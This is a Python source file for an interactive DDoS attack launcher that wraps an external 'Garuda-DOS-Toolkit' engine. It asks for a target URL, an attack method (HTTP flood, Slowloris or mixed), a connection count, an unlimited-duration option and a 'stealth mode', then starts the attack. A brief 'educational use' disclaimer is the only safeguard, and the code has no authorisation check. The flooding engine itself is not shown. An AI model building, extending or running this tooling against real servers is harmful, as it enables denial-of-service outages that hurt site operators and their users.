import argparse
import sys
import os
import time
from urllib.parse import urlparse

garuda_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'tools', 'Garuda-DOS-Toolkit'))
sys.path.insert(0, garuda_path)

try:
    from garuda.core.engine import GarudaEngine
except ImportError:
    print("Error: Could not import GarudaEngine. Make sure 'Garuda-DOS-Toolkit' is correctly placed in the 'tools' directory.")
    sys.exit(1)

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

class DDoSAttackTool:
    def __init__(self, log_func):
        self._log = log_func

    def _display_disclaimer(self):
        """
        Displays a disclaimer message when the program is run.

        Behavior:
            - Displays a warning to the user to use this tool responsibly.
            - States that this tool is created for educational and cybersecurity testing purposes.
        """
        print(f"{RED}━" * 60)
        print(f"WARNING: Use this tool responsibly.")
        print(f"This tool is created for educational and cybersecurity testing purposes only.")
        print(f"The author is not responsible for any misuse.")
        print(f"━" * 60, f"{NC}\n")
        time.sleep(3)

    def run(self):
        self._display_disclaimer()

        print(f"{YELLOW}=== Web/Server DDoS Attack Tool ==={NC}")
        target_url = input(f"{YELLOW}Enter target URL (e.g., http://example.com): {NC}").strip()
        if not target_url:
            print(f"{RED}Target URL cannot be empty. Aborting.{NC}")
            self._log("ERROR", "DDoS attack aborted: Target URL empty.")
            return

        parsed_url = urlparse(target_url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print(f"{RED}Invalid URL format. Please include http:// or https://. Aborting.{NC}")
            self._log("ERROR", f"DDoS attack aborted: Invalid URL format for {target_url}.")
            return

        print(f"\n{YELLOW}Select attack method:{NC}")
        print(f"  [1] HTTP Flood (High volume HTTP requests)")
        print(f"  [2] Slowloris (Keeps connections open, consumes server resources)")
        print(f"  [3] Mixed (Combines HTTP Flood and Slowloris)")
        print(f"  [4] Back to Main Menu")

        method_choice = input(f"\n{YELLOW}Enter your choice [1-4]: {NC}").strip()
        
        method_map = {
            '1': 'http-flood',
            '2': 'slowloris',
            '3': 'mixed'
        }
        
        selected_method = method_map.get(method_choice)

        if not selected_method:
            print(f"{RED}Invalid choice. Aborting DDoS attack.{NC}")
            self._log("ERROR", "DDoS attack aborted: Invalid method choice.")
            return
        elif method_choice == '4':
            print(f"{YELLOW}Returning to main menu.{NC}")
            return

        connections = 100
        duration = 60
        stealth_mode = False

        print(f"\n{YELLOW}Configure attack parameters:{NC}")
        try:
            conn_input = input(f"Enter number of simultaneous connections (default: {connections}): {NC}").strip()
            if conn_input:
                connections = int(conn_input)
                if connections <= 0:
                    print(f"{RED}Connections must be a positive number. Using default.{NC}")
                    connections = 100
        except ValueError:
            print(f"{RED}Invalid input for connections. Using default.{NC}")

        try:
            dur_input = input(f"Enter attack duration in seconds (default: {duration}, 0 for unlimited): {NC}").strip()
            if dur_input:
                duration = int(dur_input)
                if duration < 0:
                    print(f"{RED}Duration cannot be negative. Using default.{NC}")
                    duration = 60
        except ValueError:
            print(f"{RED}Invalid input for duration. Using default.{NC}")
        
        if selected_method == 'http-flood' or selected_method == 'mixed':
            stealth_choice = input(f"Enable stealth mode for HTTP Flood? (y/N): {NC}").strip().lower()
            if stealth_choice == 'y':
                stealth_mode = True

        garuda_args = argparse.Namespace(
            target=target_url,
            method=selected_method,
            connections=connections,
            duration=duration,
            stealth=stealth_mode,
            config=None,
            attacks=None,
            confirm_target=None
        )

        if selected_method == 'mixed':
            print(f"\n{YELLOW}For 'Mixed' method, select attacks to combine (e.g., 'http-flood slowloris'): {NC}")
            print(f"Available: http-flood, slowloris")
            mixed_attacks_input = input(f"Enter space-separated attack types: {NC}").strip().split()
            
            valid_mixed_attacks = []
            for attack in mixed_attacks_input:
                if attack in ['http-flood', 'slowloris']:
                    valid_mixed_attacks.append(attack)
                else:
                    print(f"{YELLOW}Warning: '{attack}' is not a valid mixed attack type and will be ignored.{NC}")
            
            if not valid_mixed_attacks:
                print(f"{RED}No valid mixed attacks selected. Defaulting to http-flood for mixed mode.{NC}")
                garuda_args.attacks = ['http-flood']
            else:
                garuda_args.attacks = valid_mixed_attacks

        print(f"\n{GREEN}Starting DDoS attack with the following parameters:{NC}")
        print(f"  Target: {target_url}")
        print(f"  Method: {selected_method}")
        print(f"  Connections: {connections}")
        print(f"  Duration: {duration} seconds (0 for unlimited)")
        if selected_method == 'http-flood' or selected_method == 'mixed':
            print(f"  Stealth Mode: {stealth_mode}")
        if selected_method == 'mixed' and garuda_args.attacks:
            print(f"  Mixed Attacks: {', '.join(garuda_args.attacks)}")
        print(f"{NC}")

        try:
            engine = GarudaEngine(garuda_args)
            engine.start()
            print(f"\n{GREEN}[SUCCESS] Attack session finished normally.{NC}")
            self._log("INFO", f"DDoS attack on {target_url} finished normally.")
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Attack interrupted by user.{NC}")
            self._log("INFO", f"DDoS attack on {target_url} interrupted by user.")
        except Exception as e:
            print(f"\n{RED}[FATAL] An unexpected error occurred during the attack: {e}{NC}")
            self._log("ERROR", f"DDoS attack on {target_url} failed: {e}")
        
        print(f"{GREEN}Press any key to return to the main menu...{NC}")
        input()
        